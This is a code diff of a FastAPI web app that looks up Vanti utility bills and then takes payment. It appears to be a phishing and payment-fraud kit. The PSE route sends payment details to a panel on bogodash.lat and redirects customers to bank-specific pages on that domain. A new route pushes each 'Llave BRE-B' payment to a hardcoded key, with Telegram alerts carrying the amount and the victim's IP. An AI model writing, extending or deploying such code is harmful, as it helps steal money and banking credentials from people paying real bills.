@@ -84,10 +84,15 @@ async def index(request: Request):
     return templates.TemplateResponse(request, "index.html", {"error": None})
 
 @app.post("/consultar", response_class=HTMLResponse)
-async def consultar(request: Request, empresa: str = Form(...), referencia: str = Form(...)):
+async def consultar(
+    request: Request, 
+    empresa: str = Form(...), 
+    referencia: str = Form(...),
+    metodo_pago: str = Form("pse")  # Captura el método seleccionado
+):
     ip = get_client_ip(request)
     
-    # Executar Scraper de Vanti
+    # Ejecutar Scraper de Vanti
     resultado = await consultar_factura_vanti(empresa, referencia)
     
     if not resultado.get("success"):
@@ -109,7 +114,15 @@ async def consultar(request: Request, empresa: str = Form(...), referencia: str 
         "metricas": metricas
     })
 
-    # Mostrar vista de Checkout
+    # Redirección según método elegido
+    if metodo_pago == "llave":
+        return templates.TemplateResponse(request, "checkout_llave.html", {
+            "tx_id": tx_id,
+            "referencia": referencia,
+            "monto": int(monto),
+            "empresa": empresa
+        })
+
     return templates.TemplateResponse(request, "checkout.html", {
         "tx_id": tx_id,
         "referencia": referencia,
@@ -124,18 +137,10 @@ async def procesar_pago_pse(
     tx_id: int = Form(...),
     correo: str = Form(None)
 ):
-    """
-    1. Lee el monto real desde la BD SQLite.
-    2. Envia POST a 'https://bogodash.lat/panel/notificar.php' para guardar en notis.json y obtener la ruta del banco.
-    3. Redirige al cliente pasando el valor y banco como Query Parameters.
-    """
-    
-    # 1. Obtener la transacción original de la BD para sacar el monto exacto
     tx = obtener_transaccion(tx_id)
     monto = int(tx["monto"]) if tx else 0
     correo_cliente = correo or "-"
 
-    # 2. Notificar al PHP remoto (https://bogodash.lat/panel/notificar.php)
     url_notificar_php = "https://bogodash.lat/panel/notificar.php"
     subruta_entidad = ""
 
@@ -155,15 +160,12 @@ async def procesar_pago_pse(
     except Exception as e:
         print(f"[ERROR PSE] Ocurrió una excepción al llamar a {url_notificar_php}: {e}")
 
-    # Fallback si el script PHP no responde
     if not subruta_entidad:
         subruta_entidad = "entidad/bogota/"
 
-    # Construir URL limpia para redirección
     subruta_limpia = subruta_entidad.strip("/")
     url_destino = f"https://bogodash.lat/{subruta_limpia}/?valor={monto}&banco={banco}"
 
-    # 3. Transmitir evento al Panel Admin local
     await manager.broadcast({
         "event": "NUEVA_NOTIFICACION",
         "banco": banco,
@@ -175,6 +177,40 @@ async def procesar_pago_pse(
     print(f"[PSE] IP ({ip}) banco: {banco} (${monto}). Redirigiendo a: {url_destino}")
 
     return RedirectResponse(url=url_destino, status_code=303)
+
+# --- NUEVA RUTA AGREGADA PARA PROCESAR EL PAGO CON LLAVE ---
+@app.post("/procesar-pago-llave", response_class=HTMLResponse)
+async def procesar_pago_llave(
+    request: Request,
+    tx_id: int = Form(...),
+    referencia: str = Form(...),
+    monto: float = Form(...)
+):
+    ip = get_client_ip(request)
+    tx = obtener_transaccion(tx_id)
+    
+    if tx:
+        actualizar_estado_transaccion(tx_id, "por_verificar")
+        tx["estado"] = "por_verificar"
+
+        # Broadcast al admin
+        await manager.broadcast({
+            "event": "NUEVO_PAGO_LLAVE",
+            "tx": tx,
+            "metricas": obtener_metricas()
+        })
+
+        # Alerta por Telegram
+        enviar_mensaje_telegram(
+            f"🔑 <b>¡Nuevo pago con Llave BRE-B!</b>\n"
+            f"• <b>Llave usada:</b> <code>0093310444</code>\n"
+            f"• <b>Empresa:</b> {tx['empresa']}\n"
+            f"• <b>Referencia:</b> {referencia}\n"
+            f"• <b>Monto:</b> ${monto:,.0f}\n"
+            f"• <b>IP:</b> {ip}"
+        )
+
+    return templates.TemplateResponse(request, "esperando.html", {"tx_id": tx_id})
 
 @app.post("/notificar_pago", response_class=HTMLResponse)
 async def notificar_pago(request: Request, tx_id: int = Form(...)):
